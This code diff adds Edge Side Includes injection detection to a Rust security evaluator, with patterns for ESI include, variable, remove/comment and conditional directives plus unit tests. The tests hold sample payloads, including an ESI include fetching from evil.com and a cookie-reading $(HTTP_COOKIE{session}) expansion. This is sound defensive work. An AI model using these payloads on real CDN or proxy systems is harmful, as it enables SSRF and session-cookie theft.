@@ -66,6 +66,93 @@ impl L2Evaluator for SsiEvaluator {
             }
         }
 
+        // ESI directives: <esi:* ...> and ESI variable expansions $(HTTP_*{...})
+        if lower.contains("<esi:include") {
+            let pattern = "<esi:include";
+            let pos = lower.find(pattern).unwrap_or(0);
+            dets.push(L2Detection {
+                detection_type: "ssi_esi_include".into(),
+                confidence: 0.91,
+                detail: "ESI include directive can trigger SSRF through CDN/reverse-proxy fetch".into(),
+                position: pos,
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: decoded[pos..decoded.len().min(pos + 60)].to_string(),
+                    interpretation: "Input contains '<esi:include'. ESI processors (Varnish, Squid, Akamai, Cloudflare) may fetch attacker-controlled URLs server-side, enabling SSRF and internal network probing.".into(),
+                    offset: pos,
+                    property: "User input must not contain ESI include directives or untrusted ESI markup.".into(),
+                }],
+            });
+        }
+
+        if lower.contains("<esi:vars") || lower.contains("$(http_cookie{") || lower.contains("$(http_header{") {
+            let pos = lower
+                .find("<esi:vars")
+                .or_else(|| lower.find("$(http_cookie{"))
+                .or_else(|| lower.find("$(http_header{"))
+                .unwrap_or(0);
+            dets.push(L2Detection {
+                detection_type: "ssi_esi_vars".into(),
+                confidence: 0.85,
+                detail: "ESI variable expansion can disclose cookies and headers from edge context".into(),
+                position: pos,
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: decoded[pos..decoded.len().min(pos + 60)].to_string(),
+                    interpretation: "Input contains ESI variable syntax (<esi:vars> or $(HTTP_COOKIE{...})/$(HTTP_HEADER{...})). This can exfiltrate sensitive header and cookie data via edge-side rendering.".into(),
+                    offset: pos,
+                    property: "User input must not contain ESI variable directives or HTTP_* variable expansions.".into(),
+                }],
+            });
+        }
+
+        if (lower.contains("<esi:remove>")
+            && (lower.contains("<script")
+                || lower.contains("javascript:")
+                || lower.contains("onerror=")
+                || lower.contains("onload=")))
+            || lower.contains("<esi:comment")
+        {
+            let pos = lower
+                .find("<esi:remove>")
+                .or_else(|| lower.find("<esi:comment"))
+                .unwrap_or(0);
+            dets.push(L2Detection {
+                detection_type: "ssi_esi_remove".into(),
+                confidence: 0.82,
+                detail: "ESI remove/comment directives can be abused to bypass filters and enable XSS payload shaping".into(),
+                position: pos,
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: decoded[pos..decoded.len().min(pos + 60)].to_string(),
+                    interpretation: "Input contains ESI remove/comment markup. Attackers can hide or reshape script content at the edge to bypass WAF/view-layer defenses.".into(),
+                    offset: pos,
+                    property: "User input must not contain ESI remove/comment directives or script-bearing ESI fragments.".into(),
+                }],
+            });
+        }
+
+        if lower.contains("<esi:choose") || lower.contains("<esi:when") || lower.contains("<esi:otherwise") {
+            let pos = lower
+                .find("<esi:choose")
+                .or_else(|| lower.find("<esi:when"))
+                .or_else(|| lower.find("<esi:otherwise"))
+                .unwrap_or(0);
+            dets.push(L2Detection {
+                detection_type: "ssi_esi_conditional".into(),
+                confidence: 0.86,
+                detail: "ESI conditional directives enable attacker-controlled conditional content injection".into(),
+                position: pos,
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: decoded[pos..decoded.len().min(pos + 60)].to_string(),
+                    interpretation: "Input contains ESI conditional directives (<esi:choose>/<esi:when>/<esi:otherwise>). These can inject logic-driven payloads rendered by CDN/reverse-proxy ESI processors.".into(),
+                    offset: pos,
+                    property: "User input must not contain ESI conditional directives.".into(),
+                }],
+            });
+        }
+
         dets
     }
 
@@ -117,5 +204,26 @@ mod tests {
             eval.map_class("ssi_exec"),
             Some(InvariantClass::SsiInjection)
         );
+    }
+
+    #[test]
+    fn test_esi_include_ssrf() {
+        let eval = SsiEvaluator;
+        let dets = eval.detect(r#"<esi:include src="http://evil.com/secret" />"#);
+        assert!(dets.iter().any(|d| d.detection_type == "ssi_esi_include"));
+    }
+
+    #[test]
+    fn test_esi_vars_cookie_theft() {
+        let eval = SsiEvaluator;
+        let dets = eval.detect("$(HTTP_COOKIE{session})");
+        assert!(dets.iter().any(|d| d.detection_type == "ssi_esi_vars"));
+    }
+
+    #[test]
+    fn test_esi_conditional_injection() {
+        let eval = SsiEvaluator;
+        let dets = eval.detect(r#"<esi:choose><esi:when test="$(HTTP_COOKIE{admin})==1">"#);
+        assert!(dets.iter().any(|d| d.detection_type == "ssi_esi_conditional"));
     }
 }
